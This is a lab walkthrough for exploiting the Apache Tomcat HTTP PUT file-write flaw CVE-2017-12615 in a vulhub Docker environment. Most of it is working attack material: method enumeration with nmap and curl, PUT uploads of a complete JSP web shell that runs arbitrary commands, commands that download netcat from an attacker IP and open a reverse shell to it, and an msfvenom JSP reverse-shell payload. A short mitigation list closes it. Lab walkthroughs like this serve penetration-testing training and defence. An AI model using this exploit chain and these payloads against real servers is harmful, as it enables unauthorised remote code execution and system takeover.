# Tomcat ‚Äì Arbitrary File Write via HTTP PUT
Tomcat Arbitrary File Write via HTTP PUT
- CVE-2017-12615
- Vulnerability Reference (VulnHub Lab):
 https://github.com/vulhub/vulhub/tree/master/tomcat/CVE-2017-12615

Apache Tomcat versions 7.0.0‚Äì7.0.79 are vulnerable when:

- readonly=false is set on the default servlet
- HTTP PUT is enabled
This allows arbitrary file upload, leading to RCE by uploading a JSP web shell.

### Environment Setup (VulnHub Lab)

    cd /opt/vulhub/tomcat/CVE-2017-12615
    docker compose build
    docker compose up -d

Verify service:

    netstat -nltup

Expected:

    Tomcat listening on 8080

## HTTP Methods Enumeration
### Using Nmap

    nmap -v -Pn -sT -sV -p 8080 \
    --script http-methods.nse \
    --script-args http-methods.url-path=/ \
    192.168.1.220

Without specifying path:

    nmap -v -Pn -sT -sV -p 8080 \
    --script http-methods.nse \
    192.168.1.220

#### Look for:

- PUT
- DELETE
- OPTIONS

### Using curl (OPTIONS request)
    curl -v -X OPTIONS http://192.168.1.220:8080

If PUT is present, the server is likely exploitable.


## Tomcat Arbitrary File Write via HTTP PUT (CVE-2017-12615)

This document demonstrates HTTP method enumeration, arbitrary file upload, and remote code execution (RCE) via HTTP PUT on vulnerable Apache Tomcat servers.

### üìå Vulnerability Overview

- CVE: CVE-2017-12615
- Affected Versions: Apache Tomcat 7.0.0 ‚Äì 7.0.79
- Root Cause:
    - readonly=false on the default servlet
    - HTTP PUT method enabled
- Impact: Arbitrary file upload ‚Üí JSP execution ‚Üí Remote Code Execution

### üß™ Exploiting the Vulnerability (Python PoC)
 Run the exploit script

    python 42966.py -u http://192.168.1.103:8080 -pwn pwn


Attempts to upload a JSP file and confirm write access.

### üìÇ JSP File Upload & Execution
Create a Test JSP (test.jsp)

    vim test.jsp

    <%
    out.write("<html><body><h3>[+] JSP uploaded successfully via HTTP PUT.</h3></body></html>");
    %>

#### Upload via HTTP PUT

‚ö†Ô∏è Important: The trailing / is required.

    curl -X PUT http://192.168.1.103:8080/test.jsp/ \
    -d @- < test.jsp

#### Access the Uploaded JSP

    curl http://192.168.1.103:8080/test.jsp


‚úÖ If rendered, JSP execution is confirmed.

### üíª Remote Command Execution via JSP
Create Command Execution JSP (cmd.jsp)

    <%@ page import="java.util.*,java.io.*" %>
    <html><body>
    <h3>JSP Command Execution</h3>
    
    <form method="POST">
    <input type="text" name="cmd">
    <input type="submit" value="Execute">
    </form>
    
    <pre>
    <%
    if (request.getParameter("cmd") != null) {
        String cmd = request.getParameter("cmd");
        out.println("Command: " + cmd + "\n");
    
        Process p;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            p = Runtime.getRuntime().exec("cmd.exe /C " + cmd);
        } else {
            p = Runtime.getRuntime().exec(cmd);
        }
    
        BufferedReader br = new BufferedReader(
            new InputStreamReader(p.getInputStream())
        );
    
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
    }
    %>
    </pre>
    </body></html>

### Upload the JSP Web Shell

    curl -X PUT http://192.168.1.103:8080/cmd.jsp/ \
    -d @- < cmd.jsp

###  Access the Web Shell
http://192.168.1.103:8080/cmd.jsp

### üßæ Example Commands (via Web Shell)

    ls -lha /tmp

    wget http://192.168.1.6/nc64 -O /tmp/nc64

    chmod +x /tmp/nc64

    /tmp/nc64 -e /bin/bash 192.168.1.6 443

## üîÅ Reverse Shell via JSP (Metasploit)
Generate JSP Reverse Shell

    msfvenom -p java/jsp_shell_reverse_tcp \
    LHOST=192.168.1.6 \
    LPORT=443 \
    -f raw > shell.jsp

### Upload the Reverse Shell

    curl -X PUT http://192.168.1.103:8080/shell.jsp/ \
    -d @- < shell.jsp

### Trigger the Reverse Shell
    http://192.168.1.103:8080/shell.jsp


Ensure a listener is running on your attacker machine.

### ‚ö†Ô∏è Key Notes & Gotchas

- Trailing / after .jsp is mandatory
- Upload path must be writable by Tomcat
- Default servlet must have:
- readonly=false

Fixed in Tomcat ‚â• 7.0.80

### üõ°Ô∏è Mitigation & Defensive Recommendations

- Disable HTTP PUT unless explicitly required
- Set readonly=true on the default servlet
- Restrict upload directories
- Monitor anomalous PUT requests (WAF / IDS)

Keep Tomcat fully patched

### ‚úÖ Conclusion

- Enumerated HTTP methods (PUT, DELETE, OPTIONS)
- Exploited arbitrary file upload via PUT
- Achieved JSP execution and RCE
- Demonstrated reverse shell access
